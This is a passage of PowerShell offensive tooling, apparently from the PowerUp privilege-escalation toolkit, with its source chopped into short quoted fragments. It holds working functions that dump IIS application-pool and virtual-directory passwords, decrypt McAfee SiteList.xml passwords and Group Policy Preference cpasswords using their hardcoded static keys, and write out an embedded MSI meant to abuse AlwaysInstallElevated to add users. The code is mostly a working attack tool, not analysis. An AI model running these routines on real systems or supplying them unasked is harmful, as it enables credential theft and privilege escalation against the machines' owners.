        #',' Check if any ','connection str','ings were foun','d
        if (',' $DataTable.ro','ws.Count -gt 0',' ) {
         ','   # Display r','esults in list',' view that can',' feed into the',' pipeline
    ','        $DataT','able | Sort-Ob','ject user,pass',',dbserv,vdir,p','ath,encr | Sel','ect-Object use','r,pass,dbserv,','vdir,path,encr',' -Unique
     ','   }
        e','lse {
        ','    Write-Verb','ose ''No connec','tion strings f','ound.''
       ','     $False
  ','      }
    }
','    else {
   ','     Write-Ver','bose ''Appcmd.e','xe does not ex','ist in the def','ault location.','''
        $Fal','se
    }
    $','ErrorActionPre','ference = $Ori','gError
}


fun','ction Get-Appl','icationHost {
','<#
.SYNOPSIS

','Recovers encry','pted applicati','on pool and vi','rtual director','y passwords fr','om the applica','tionHost.confi','g on the syste','m.

Author: Sc','ott Sutherland','  
License: BS','D 3-Clause  
R','equired Depend','encies: None  ','

.DESCRIPTION','

This script ','will decrypt a','nd recover app','lication pool ','and virtual di','rectory passwo','rds
from the a','pplicationHost','.config file o','n the system. ',' The output su','pports the
pip','eline which ca','n be used to c','onvert all of ','the results in','to a pretty ta','ble by piping
','to format-tabl','e.

.EXAMPLE

','Return applica','tion pool and ','virtual direct','ory passwords ','from the appli','cationHost.con','fig on the sys','tem.

Get-Appl','icationHost

u','ser    : PoolU','ser1
pass    :',' PoolParty1!
t','ype    : Appli','cation Pool
vd','ir    : NA
app','pool : Applica','tionPool1
user','    : PoolUser','2
pass    : Po','olParty2!
type','    : Applicat','ion Pool
vdir ','   : NA
apppoo','l : Applicatio','nPool2
user   ',' : VdirUser1
p','ass    : VdirP','assword1!
type','    : Virtual ','Directory
vdir','    : site1/vd','ir1/
apppool :',' NA
user    : ','VdirUser2
pass','    : VdirPass','word2!
type   ',' : Virtual Dir','ectory
vdir   ',' : site2/
appp','ool : NA

.EXA','MPLE

Return a',' list of clear','text and decry','pted connect s','trings from we','b.config files','.

Get-Applica','tionHost | For','mat-Table -Aut','osize

user   ','       pass   ','            ty','pe            ','  vdir        ',' apppool
---- ','         ---- ','              ','----          ','    ----      ','   -------
Poo','lUser1     Poo','lParty1!      ',' Application P','ool   NA      ','     Applicati','onPool1
PoolUs','er2     PoolPa','rty2!       Ap','plication Pool','   NA         ','  ApplicationP','ool2
VdirUser1','     VdirPassw','ord1!    Virtu','al Directory  ','site1/vdir1/ N','A
VdirUser2   ','  VdirPassword','2!    Virtual ','Directory  sit','e2/       NA

','.OUTPUTS

Syst','em.Data.DataTa','ble

System.Bo','olean

.LINK

','https://github','.com/darkopera','tor/Posh-SecMo','d/blob/master/','PostExploitati','on/PostExploit','ation.psm1
htt','p://www.netspi','.com
http://ww','w.iis.net/lear','n/get-started/','getting-starte','d-with-iis/get','ting-started-w','ith-appcmdexe
','http://msdn.mi','crosoft.com/en','-us/library/k6','h9cz8h(v=vs.80',').aspx

.NOTES','

Author: Scot','t Sutherland -',' 2014, NetSPI
','Version: Get-A','pplicationHost',' v1.0
Comments',': Should work ','on IIS 6 and A','bove
#>

    [','Diagnostics.Co','deAnalysis.Sup','pressMessageAt','tribute(''PSSho','uldProcess'', ''',''')]
    [Diagn','ostics.CodeAna','lysis.Suppress','MessageAttribu','te(''PSAvoidUsi','ngInvokeExpres','sion'', '''')]
  ','  [OutputType(','''System.Data.D','ataTable'')]
  ','  [OutputType(','''System.Boolea','n'')]
    [Cmdl','etBinding()]
 ','   Param()

  ','  $OrigError =',' $ErrorActionP','reference
    ','$ErrorActionPr','eference = ''Si','lentlyContinue','''

    # Check',' if appcmd.exe',' exists
    if',' (Test-Path  (','"$Env:SystemRo','ot\System32\in','etsrv\appcmd.e','xe")) {
      ','  # Create dat','a table to hou','se results
   ','     $DataTabl','e = New-Object',' System.Data.D','ataTable

    ','    # Create a','nd name column','s in the data ','table
        ','$Null = $DataT','able.Columns.A','dd(''user'')
   ','     $Null = $','DataTable.Colu','mns.Add(''pass''',')
        $Nul','l = $DataTable','.Columns.Add(''','type'')
       ',' $Null = $Data','Table.Columns.','Add(''vdir'')
  ','      $Null = ','$DataTable.Col','umns.Add(''appp','ool'')

       ',' # Get list of',' application p','ools
        I','nvoke-Expressi','on "$Env:Syste','mRoot\System32','\inetsrv\appcm','d.exe list app','pools /text:na','me" | ForEach-','Object {

    ','        # Get ','application po','ol name
      ','      $PoolNam','e = $_

      ','      # Get us','ername
       ','     $PoolUser','Cmd = "$Env:Sy','stemRoot\Syste','m32\inetsrv\ap','pcmd.exe list ','apppool " + "`','"$PoolName`" /','text:processmo','del.username"
','            $P','oolUser = Invo','ke-Expression ','$PoolUserCmd

','            # ','Get password
 ','           $Po','olPasswordCmd ','= "$Env:System','Root\System32\','inetsrv\appcmd','.exe list appp','ool " + "`"$Po','olName`" /text',':processmodel.','password"
    ','        $PoolP','assword = Invo','ke-Expression ','$PoolPasswordC','md

          ','  # Check if c','redentials exi','sts
          ','  if (($PoolPa','ssword -ne "")',' -and ($PoolPa','ssword -isnot ','[system.array]',')) {
         ','       # Add c','redentials to ','database
     ','           $Nu','ll = $DataTabl','e.Rows.Add($Po','olUser, $PoolP','assword,''Appli','cation Pool'',''','NA'',$PoolName)','
            }','
        }

  ','      # Get li','st of virtual ','directories
  ','      Invoke-E','xpression "$En','v:SystemRoot\S','ystem32\inetsr','v\appcmd.exe l','ist vdir /text',':vdir.name" | ','ForEach-Object',' {

          ','  # Get Virtua','l Directory Na','me
           ',' $VdirName = $','_

           ',' # Get usernam','e
            ','$VdirUserCmd =',' "$Env:SystemR','oot\System32\i','netsrv\appcmd.','exe list vdir ','" + "`"$VdirNa','me`" /text:use','rName"
       ','     $VdirUser',' = Invoke-Expr','ession $VdirUs','erCmd

       ','     # Get pas','sword
        ','    $VdirPassw','ordCmd = "$Env',':SystemRoot\Sy','stem32\inetsrv','\appcmd.exe li','st vdir " + "`','"$VdirName`" /','text:password"','
            $','VdirPassword =',' Invoke-Expres','sion $VdirPass','wordCmd

     ','       # Check',' if credential','s exists
     ','       if (($V','dirPassword -n','e "") -and ($V','dirPassword -i','snot [system.a','rray])) {
    ','            # ','Add credential','s to database
','              ','  $Null = $Dat','aTable.Rows.Ad','d($VdirUser, $','VdirPassword,''','Virtual Direct','ory'',$VdirName',',''NA'')
       ','     }
       ',' }

        # ','Check if any p','asswords were ','found
        ','if ( $DataTabl','e.rows.Count -','gt 0 ) {
     ','       # Displ','ay results in ','list view that',' can feed into',' the pipeline
','            $D','ataTable |  So','rt-Object type',',user,pass,vdi','r,apppool | Se','lect-Object us','er,pass,type,v','dir,apppool -U','nique
        ','}
        else',' {
           ',' # Status user','
            W','rite-Verbose ''','No application',' pool or virtu','al directory p','asswords were ','found.''
      ','      $False
 ','       }
    }','
    else {
  ','      Write-Ve','rbose ''Appcmd.','exe does not e','xist in the de','fault location','.''
        $Fa','lse
    }
    ','$ErrorActionPr','eference = $Or','igError
}


fu','nction Get-Sit','eListPassword ','{
<#
.SYNOPSIS','

Retrieves th','e plaintext pa','sswords for fo','und McAfee''s S','iteList.xml fi','les.
Based on ','Jerome Nokin (','@funoverip)''s ','Python solutio','n (in links).
','
Author: Jerom','e Nokin (@funo','verip)  
Power','Shell Port: @h','armj0y  
Licen','se: BSD 3-Clau','se  
Required ','Dependencies: ','None  

.DESCR','IPTION

Search','es for any McA','fee SiteList.x','ml in C:\Progr','am Files\, C:\','Program Files ','(x86)\,
C:\Doc','uments and Set','tings\, or C:\','Users\. For an','y files found,',' the appropria','te
credential ','fields are ext','racted and dec','rypted using t','he internal Ge','t-DecryptedSit','elistPassword
','function that ','takes advantag','e of McAfee''s ','static key enc','ryption. Any d','ecrypted crede','ntials
are out','put in custom ','objects. See l','inks for more ','information.

','.PARAMETER Pat','h

Optional pa','th to a SiteLi','st.xml file or',' folder.

.EXA','MPLE

Get-Site','ListPassword

','EncPassword : ','jWbTyS7BL1Hj7P','kO5Di/QhhYmcGj','5cOoZ2OkDTrFXs','R/abAFPM9B3Q==','
UserName    :','
Path        :',' Products/Comm','onUpdater
Name','        : McAf','eeHttp
DecPass','word : MyStron','gPassword!
Ena','bled     : 1
D','omainName  :
S','erver      : u','pdate.nai.com:','80

EncPasswor','d : jWbTyS7BL1','Hj7PkO5Di/QhhY','mcGj5cOoZ2OkDT','rFXsR/abAFPM9B','3Q==
UserName ','   : McAfeeSer','vice
Path     ','   : Repositor','y$
Name       ',' : Paris
DecPa','ssword : MyStr','ongPassword!
E','nabled     : 1','
DomainName  :',' companydomain','
Server      :',' paris001

Enc','Password : jWb','TyS7BL1Hj7PkO5','Di/QhhYmcGj5cO','oZ2OkDTrFXsR/a','bAFPM9B3Q==
Us','erName    : Mc','AfeeService
Pa','th        : Re','pository$
Name','        : Toky','o
DecPassword ',': MyStrongPass','word!
Enabled ','    : 1
Domain','Name  : compan','ydomain
Server','      : tokyo0','00

.OUTPUTS

','PowerUp.SiteLi','stPassword

.L','INK

https://g','ithub.com/funo','verip/mcafee-s','itelist-pwd-de','cryption/
http','s://funoverip.','net/2016/02/mc','afee-sitelist-','xml-password-d','ecryption/
htt','ps://github.co','m/tfairane/Hac','kStory/blob/ma','ster/McAfeePri','vesc.md
https:','//www.syss.de/','fileadmin/doku','mente/Publikat','ionen/2011/SyS','S_2011_Deeg_Pr','ivilege_Escala','tion_via_Antiv','irus_Software.','pdf
#>

    [D','iagnostics.Cod','eAnalysis.Supp','ressMessageAtt','ribute(''PSShou','ldProcess'', ''''',')]
    [Output','Type(''PowerUp.','SiteListPasswo','rd'')]
    [Cmd','letBinding()]
','    Param(
   ','     [Paramete','r(Position = 0',', ValueFromPip','eline = $True)',']
        [Val','idateScript({T','est-Path -Path',' $_ })]
      ','  [String[]]
 ','       $Path
 ','   )

    BEGI','N {
        fu','nction Local:G','et-DecryptedSi','telistPassword',' {
           ',' # PowerShell ','adaptation of ','https://github','.com/funoverip','/mcafee-siteli','st-pwd-decrypt','ion/
         ','   # Original ','Author: Jerome',' Nokin (@funov','erip / jerome.','nokin@gmail.co','m)
           ',' # port by @ha','rmj0y
        ','    [Diagnosti','cs.CodeAnalysi','s.SuppressMess','ageAttribute(''','PSShouldProces','s'', '''')]
     ','       [Cmdlet','Binding()]
   ','         Param','(
            ','    [Parameter','(Mandatory = $','True)]
       ','         [Stri','ng]
          ','      $B64Pass','
            )','

            ','# make sure th','e appropriate ','assemblies are',' loaded
      ','      Add-Type',' -Assembly Sys','tem.Security
 ','           Add','-Type -Assembl','y System.Core
','
            #',' declare the e','ncoding/crypto',' providers we ','need
         ','   $Encoding =',' [System.Text.','Encoding]::ASC','II
           ',' $SHA1 = New-O','bject System.S','ecurity.Crypto','graphy.SHA1Cry','ptoServiceProv','ider
         ','   $3DES = New','-Object System','.Security.Cryp','tography.Tripl','eDESCryptoServ','iceProvider

 ','           # s','tatic McAfee k','ey XOR key LOL','
            $','XORKey = 0x12,','0x15,0x0F,0x10',',0x11,0x1C,0x1','A,0x06,0x0A,0x','1F,0x1B,0x18,0','x17,0x16,0x05,','0x19

        ','    # xor the ','input b64 stri','ng with the st','atic XOR key
 ','           $I ','= 0;
         ','   $UnXored = ','[System.Conver','t]::FromBase64','String($B64Pas','s) | Foreach-O','bject { $_ -BX','or $XORKey[$I+','+ % $XORKey.Le','ngth] }

     ','       # build',' the static Mc','Afee 3DES key ','TROLOL
       ','     $3DESKey ','= $SHA1.Comput','eHash($Encodin','g.GetBytes(''<!','@#$%^>'')) + ,0','x00*4

       ','     # set the',' options we ne','ed
           ',' $3DES.Mode = ','''ECB''
        ','    $3DES.Padd','ing = ''None''
 ','           $3D','ES.Key = $3DES','Key

         ','   # decrypt t','he unXor''ed bl','ock
          ','  $Decrypted =',' $3DES.CreateD','ecryptor().Tra','nsformFinalBlo','ck($UnXored, 0',', $UnXored.Len','gth)

        ','    # ignore t','he padding for',' the result
  ','          $Ind','ex = [Array]::','IndexOf($Decry','pted, [Byte]0)','
            i','f ($Index -ne ','-1) {
        ','        $Decry','ptedPass = $En','coding.GetStri','ng($Decrypted[','0..($Index-1)]',')
            ','}
            ','else {
       ','         $Decr','yptedPass = $E','ncoding.GetStr','ing($Decrypted',')
            ','}

           ',' New-Object -T','ypeName PSObje','ct -Property @','{''Encrypted''=$','B64Pass;''Decry','pted''=$Decrypt','edPass}
      ','  }

        f','unction Local:','Get-SitelistFi','eld {
        ','    [Diagnosti','cs.CodeAnalysi','s.SuppressMess','ageAttribute(''','PSShouldProces','s'', '''')]
     ','       [Cmdlet','Binding()]
   ','         Param','(
            ','    [Parameter','(Mandatory = $','True)]
       ','         [Stri','ng]
          ','      $Path
  ','          )

 ','           try',' {
           ','     [Xml]$Sit','eListXml = Get','-Content -Path',' $Path

      ','          if (','$SiteListXml.I','nnerXml -Like ','"*password*") ','{
            ','        Write-','Verbose "Poten','tial password ','in found in $P','ath"

        ','            $S','iteListXml.Sit','eLists.SiteLis','t.ChildNodes |',' Foreach-Objec','t {
          ','              ','try {
        ','              ','      $Passwor','dRaw = $_.Pass','word.''#Text''

','              ','              ','if ($_.Passwor','d.Encrypted -e','q 1) {
       ','              ','           # d','ecrypt the bas','e64 password i','f it''s marked ','as encrypted
 ','              ','              ','   $DecPasswor','d = if ($Passw','ordRaw) { (Get','-DecryptedSite','listPassword -','B64Pass $Passw','ordRaw).Decryp','ted } else {''''','}
            ','              ','  }
          ','              ','    else {
   ','              ','              ',' $DecPassword ','= $PasswordRaw','
             ','              ',' }

          ','              ','    $Server = ','if ($_.ServerI','P) { $_.Server','IP } else { $_','.Server }
    ','              ','          $Pat','h = if ($_.Sha','reName) { $_.S','hareName } els','e { $_.Relativ','ePath }

     ','              ','         $Obje','ctProperties =',' @{
          ','              ','        ''Name''',' = $_.Name;
  ','              ','              ','  ''Enabled'' = ','$_.Enabled;
  ','              ','              ','  ''Server'' = $','Server;
      ','              ','            ''P','ath'' = $Path;
','              ','              ','    ''DomainNam','e'' = $_.Domain','Name;
        ','              ','          ''Use','rName'' = $_.Us','erName;
      ','              ','            ''E','ncPassword'' = ','$PasswordRaw;
','              ','              ','    ''DecPasswo','rd'' = $DecPass','word;
        ','              ','      }
      ','              ','        $Out =',' New-Object -T','ypeName PSObje','ct -Property $','ObjectProperti','es
           ','              ','   $Out.PSObje','ct.TypeNames.I','nsert(0, ''Powe','rUp.SiteListPa','ssword'')
     ','              ','         $Out
','              ','          }
  ','              ','        catch ','{
            ','              ','  Write-Verbos','e "Error parsi','ng node : $_"
','              ','          }
  ','              ','    }
        ','        }
    ','        }
    ','        catch ','{
            ','    Write-Warn','ing "Error par','sing file ''$Pa','th'' : $_"
    ','        }
    ','    }
    }

 ','   PROCESS {
 ','       if ($PS','BoundParameter','s[''Path'']) {
 ','           $Xm','lFilePaths = $','Path
        }','
        else ','{
            ','$XmlFilePaths ','= @(''C:\Progra','m Files\'',''C:\','Program Files ','(x86)\'',''C:\Do','cuments and Se','ttings\'',''C:\U','sers\'')
      ','  }

        $','XmlFilePaths |',' Foreach-Objec','t { Get-ChildI','tem -Path $_ -','Recurse -Inclu','de ''SiteList.x','ml'' -ErrorActi','on SilentlyCon','tinue } | Wher','e-Object { $_ ','} | Foreach-Ob','ject {
       ','     Write-Ver','bose "Parsing ','SiteList.xml f','ile ''$($_.Full','name)''"
      ','      Get-Site','listField -Pat','h $_.Fullname
','        }
    ','}
}


function',' Get-CachedGPP','Password {
<#
','.SYNOPSIS

Ret','rieves the pla','intext passwor','d and other in','formation for ','accounts pushe','d through Grou','p Policy Prefe','rences and
lef','t in cached fi','les on the hos','t.

Author: Ch','ris Campbell (','@obscuresec)  ','
License: BSD ','3-Clause  
Req','uired Dependen','cies: None  

','.DESCRIPTION

','Get-CachedGPPP','assword search','es the local m','achine for cac','hed for groups','.xml, schedule','dtasks.xml, se','rvices.xml and','
datasources.x','ml files and r','eturns plainte','xt passwords.
','
.EXAMPLE

Get','-CachedGPPPass','word

NewName ','  : [BLANK]
Ch','anged   : {201','3-04-25 18:36:','07}
Passwords ',': {Super!!!Pas','sword}
UserNam','es : {SuperSec','retBackdoor}
F','ile      : C:\','ProgramData\Mi','crosoft\Group ','Policy\History','\{32C4C89F-7
 ','           C3A','-4227-A61D-8EF','72B5B9E42}\Mac','hine\Preferenc','es\Groups\Gr
 ','           oup','s.xml

.LINK

','http://www.obs','curesecurity.b','logspot.com/20','12/05/gpp-pass','word-retrieval','-with-powershe','ll.html
https:','//github.com/m','attifestation/','PowerSploit/bl','ob/master/Reco','n/Get-GPPPassw','ord.ps1
https:','//github.com/r','apid7/metasplo','it-framework/b','lob/master/mod','ules/post/wind','ows/gather/cre','dentials/gpp.r','b
http://esec-','pentest.sogeti','.com/exploitin','g-windows-2008','-group-policy-','preferences
ht','tp://rewtdance','.blogspot.com/','2012/06/exploi','ting-windows-2','008-group-poli','cy.html
#>

  ','  [CmdletBindi','ng()]
    Para','m()

    # Som','e XML issues b','etween version','s
    Set-Stri','ctMode -Versio','n 2

    # mak','e sure the app','ropriate assem','blies are load','ed
    Add-Typ','e -Assembly Sy','stem.Security
','    Add-Type -','Assembly Syste','m.Core

    # ','helper that de','codes and decr','ypts password
','    function l','ocal:Get-Decry','ptedCpassword ','{
        [Dia','gnostics.CodeA','nalysis.Suppre','ssMessageAttri','bute(''PSAvoidU','singPlainTextF','orPassword'', ''',''')]
        [C','mdletBinding()',']
        Para','m(
           ',' [string] $Cpa','ssword
       ',' )

        tr','y {
          ','  # Append app','ropriate paddi','ng based on st','ring length
  ','          $Mod',' = ($Cpassword','.length % 4)

','            sw','itch ($Mod) {
','              ','  ''1'' {$Cpassw','ord = $Cpasswo','rd.Substring(0',',$Cpassword.Le','ngth -1)}
    ','            ''2',''' {$Cpassword ','+= (''='' * (4 -',' $Mod))}
     ','           ''3''',' {$Cpassword +','= (''='' * (4 - ','$Mod))}
      ','      }

     ','       $Base64','Decoded = [Con','vert]::FromBas','e64String($Cpa','ssword)

     ','       # Creat','e a new AES .N','ET Crypto Obje','ct
           ',' $AesObject = ','New-Object Sys','tem.Security.C','ryptography.Ae','sCryptoService','Provider
     ','       [Byte[]','] $AesKey = @(','0x4e,0x99,0x06',',0xe8,0xfc,0xb','6,0x6c,0xc9,0x','fa,0xf4,0x93,0','x10,0x62,0x0f,','0xfe,0xe8,
   ','              ','              ','  0xf4,0x96,0x','e8,0x06,0xcc,0','x05,0x79,0x90,','0x20,0x9b,0x09',',0xa4,0x33,0xb','6,0x6c,0x1b)

','            # ','Set IV to all ','nulls to preve','nt dynamic gen','eration of IV ','value
        ','    $AesIV = N','ew-Object Byte','[]($AesObject.','IV.Length)
   ','         $AesO','bject.IV = $Ae','sIV
          ','  $AesObject.K','ey = $AesKey
 ','           $De','cryptorObject ','= $AesObject.C','reateDecryptor','()
           ',' [Byte[]] $Out','Block = $Decry','ptorObject.Tra','nsformFinalBlo','ck($Base64Deco','ded, 0, $Base6','4Decoded.lengt','h)

          ','  return [Syst','em.Text.Unicod','eEncoding]::Un','icode.GetStrin','g($OutBlock)
 ','       }

    ','    catch {
  ','          Writ','e-Error $Error','[0]
        }
','    }

    # h','elper that par','ses fields fro','m the found xm','l preference f','iles
    funct','ion local:Get-','GPPInnerField ','{
        [Dia','gnostics.CodeA','nalysis.Suppre','ssMessageAttri','bute(''PSShould','Process'', '''')]','
        [Cmdl','etBinding()]
 ','       Param(
','            $F','ile
        )
','
        try {','
            $','Filename = Spl','it-Path $File ','-Leaf
        ','    [XML] $Xml',' = Get-Content',' ($File)

    ','        $Cpass','word = @()
   ','         $User','Name = @()
   ','         $NewN','ame = @()
    ','        $Chang','ed = @()
     ','       $Passwo','rd = @()

    ','        # chec','k for password',' field
       ','     if ($Xml.','innerxml -like',' "*cpassword*"','){

          ','      Write-Ve','rbose "Potenti','al password in',' $File"

     ','           swi','tch ($Filename',') {
          ','          ''Gro','ups.xml'' {
   ','              ','       $Cpassw','ord += , $Xml ','| Select-Xml "','/Groups/User/P','roperties/@cpa','ssword" | Sele','ct-Object -Exp','and Node | For','Each-Object {$','_.Value}
     ','              ','     $UserName',' += , $Xml | S','elect-Xml "/Gr','oups/User/Prop','erties/@userNa','me" | Select-O','bject -Expand ','Node | ForEach','-Object {$_.Va','lue}
         ','              ',' $NewName += ,',' $Xml | Select','-Xml "/Groups/','User/Propertie','s/@newName" | ','Select-Object ','-Expand Node |',' ForEach-Objec','t {$_.Value}
 ','              ','         $Chan','ged += , $Xml ','| Select-Xml "','/Groups/User/@','changed" | Sel','ect-Object -Ex','pand Node | Fo','rEach-Object {','$_.Value}
    ','              ','  }

         ','           ''Se','rvices.xml'' {
','              ','          $Cpa','ssword += , $X','ml | Select-Xm','l "/NTServices','/NTService/Pro','perties/@cpass','word" | Select','-Object -Expan','d Node | ForEa','ch-Object {$_.','Value}
       ','              ','   $UserName +','= , $Xml | Sel','ect-Xml "/NTSe','rvices/NTServi','ce/Properties/','@accountName" ','| Select-Objec','t -Expand Node',' | ForEach-Obj','ect {$_.Value}','
             ','           $Ch','anged += , $Xm','l | Select-Xml',' "/NTServices/','NTService/@cha','nged" | Select','-Object -Expan','d Node | ForEa','ch-Object {$_.','Value}
       ','             }','

            ','        ''Sched','uledtasks.xml''',' {
           ','             $','Cpassword += ,',' $Xml | Select','-Xml "/Schedul','edTasks/Task/P','roperties/@cpa','ssword" | Sele','ct-Object -Exp','and Node | For','Each-Object {$','_.Value}
     ','              ','     $UserName',' += , $Xml | S','elect-Xml "/Sc','heduledTasks/T','ask/Properties','/@runAs" | Sel','ect-Object -Ex','pand Node | Fo','rEach-Object {','$_.Value}
    ','              ','      $Changed',' += , $Xml | S','elect-Xml "/Sc','heduledTasks/T','ask/@changed" ','| Select-Objec','t -Expand Node',' | ForEach-Obj','ect {$_.Value}','
             ','       }

    ','              ','  ''DataSources','.xml'' {
      ','              ','    $Cpassword',' += , $Xml | S','elect-Xml "/Da','taSources/Data','Source/Propert','ies/@cpassword','" | Select-Obj','ect -Expand No','de | ForEach-O','bject {$_.Valu','e}
           ','             $','UserName += , ','$Xml | Select-','Xml "/DataSour','ces/DataSource','/Properties/@u','sername" | Sel','ect-Object -Ex','pand Node | Fo','rEach-Object {','$_.Value}
    ','              ','      $Changed',' += , $Xml | S','elect-Xml "/Da','taSources/Data','Source/@change','d" | Select-Ob','ject -Expand N','ode | ForEach-','Object {$_.Val','ue}
          ','          }

 ','              ','     ''Printers','.xml'' {
      ','              ','    $Cpassword',' += , $Xml | S','elect-Xml "/Pr','inters/SharedP','rinter/Propert','ies/@cpassword','" | Select-Obj','ect -Expand No','de | ForEach-O','bject {$_.Valu','e}
           ','             $','UserName += , ','$Xml | Select-','Xml "/Printers','/SharedPrinter','/Properties/@u','sername" | Sel','ect-Object -Ex','pand Node | Fo','rEach-Object {','$_.Value}
    ','              ','      $Changed',' += , $Xml | S','elect-Xml "/Pr','inters/SharedP','rinter/@change','d" | Select-Ob','ject -Expand N','ode | ForEach-','Object {$_.Val','ue}
          ','          }

 ','              ','     ''Drives.x','ml'' {
        ','              ','  $Cpassword +','= , $Xml | Sel','ect-Xml "/Driv','es/Drive/Prope','rties/@cpasswo','rd" | Select-O','bject -Expand ','Node | ForEach','-Object {$_.Va','lue}
         ','              ',' $UserName += ',', $Xml | Selec','t-Xml "/Drives','/Drive/Propert','ies/@username"',' | Select-Obje','ct -Expand Nod','e | ForEach-Ob','ject {$_.Value','}
            ','            $C','hanged += , $X','ml | Select-Xm','l "/Drives/Dri','ve/@changed" |',' Select-Object',' -Expand Node ','| ForEach-Obje','ct {$_.Value}
','              ','      }
      ','          }
  ','         }

  ','         ForEa','ch ($Pass in $','Cpassword) {
 ','              ','Write-Verbose ','"Decrypting $P','ass"
         ','      $Decrypt','edPassword = G','et-DecryptedCp','assword $Pass
','              ',' Write-Verbose',' "Decrypted a ','password of $D','ecryptedPasswo','rd"
          ','     #append a','ny new passwor','ds to array
  ','             $','Password += , ','$DecryptedPass','word
         ','  }

         ','   # put [BLAN','K] in variable','s
            ','if (-not $Pass','word) {$Passwo','rd = ''[BLANK]''','}
            ','if (-not $User','Name) {$UserNa','me = ''[BLANK]''','}
            ','if (-not $Chan','ged)  {$Change','d = ''[BLANK]''}','
            i','f (-not $NewNa','me)  {$NewName',' = ''[BLANK]''}
','
            #',' Create custom',' object to out','put results
  ','          $Obj','ectProperties ','= @{''Passwords',''' = $Password;','
             ','              ','       ''UserNa','mes'' = $UserNa','me;
          ','              ','          ''Cha','nged'' = $Chang','ed;
          ','              ','          ''New','Name'' = $NewNa','me;
          ','              ','          ''Fil','e'' = $File}

 ','           $Re','sultsObject = ','New-Object -Ty','peName PSObjec','t -Property $O','bjectPropertie','s
            ','Write-Verbose ','"The password ','is between {} ','and may be mor','e than one val','ue."
         ','   if ($Result','sObject) { Ret','urn $ResultsOb','ject }
       ',' }

        ca','tch {Write-Err','or $Error[0]}
','    }

    try',' {
        $Al','lUsers = $Env:','ALLUSERSPROFIL','E

        if ','($AllUsers -no','tmatch ''Progra','mData'') {
    ','        $AllUs','ers = "$AllUse','rs\Application',' Data"
       ',' }

        # ','discover any l','ocally cached ','GPP .xml files','
        $XMlF','iles = Get-Chi','ldItem -Path $','AllUsers -Recu','rse -Include ''','Groups.xml'',''S','ervices.xml'',''','Scheduledtasks','.xml'',''DataSou','rces.xml'',''Pri','nters.xml'',''Dr','ives.xml'' -For','ce -ErrorActio','n SilentlyCont','inue

        ','if ( -not $XMl','Files ) {
    ','        Write-','Verbose ''No pr','eference files',' found.''
     ','   }
        e','lse {
        ','    Write-Verb','ose "Found $($','XMLFiles | Mea','sure-Object | ','Select-Object ','-ExpandPropert','y Count) files',' that could co','ntain password','s."

         ','   ForEach ($F','ile in $XMLFil','es) {
        ','        Get-Gp','pInnerField $F','ile.Fullname
 ','           }
 ','       }
    }','

    catch {
','        Write-','Error $Error[0',']
    }
}


fu','nction Write-U','serAddMSI {
<#','
.SYNOPSIS

Wr','ites out a pre','compiled MSI i','nstaller that ','prompts for a ','user/group add','ition.
This fu','nction can be ','used to abuse ','Get-RegistryAl','waysInstallEle','vated.

Author',': Will Schroed','er (@harmj0y) ',' 
License: BSD',' 3-Clause  
Re','quired Depende','ncies: None  
','
.DESCRIPTION
','
Writes out a ','precompiled MS','I installer th','at prompts for',' a user/group ','addition.
This',' function can ','be used to abu','se Get-Registr','yAlwaysInstall','Elevated.

.EX','AMPLE

Write-U','serAddMSI

Wri','tes the user a','dd MSI to the ','local director','y.

.OUTPUTS

','PowerUp.UserAd','dMSI
#>

    [','Diagnostics.Co','deAnalysis.Sup','pressMessageAt','tribute(''PSSho','uldProcess'', ''',''')]
    [Outpu','tType(''Service','Process.UserAd','dMSI'')]
    [C','mdletBinding()',']
    Param(
 ','       [Parame','ter(Position =',' 0, ValueFromP','ipeline = $Tru','e, ValueFromPi','pelineByProper','tyName = $True',')]
        [Al','ias(''ServiceNa','me'')]
        ','[String]
     ','   [ValidateNo','tNullOrEmpty()',']
        $Pat','h = ''UserAdd.m','si''
    )

   ',' $Binary = ''0M','8R4KGxGuEAAAAA','AAAAAAAAAAAAAA','AAPgAEAP7/DAAG','AAAAAAAAAAEAAA','ABAAAAAQAAAAAA','AAAAEAAAAgAAAA','EAAAD+////AAAA','AAAAAAD///////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','////////8AAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAA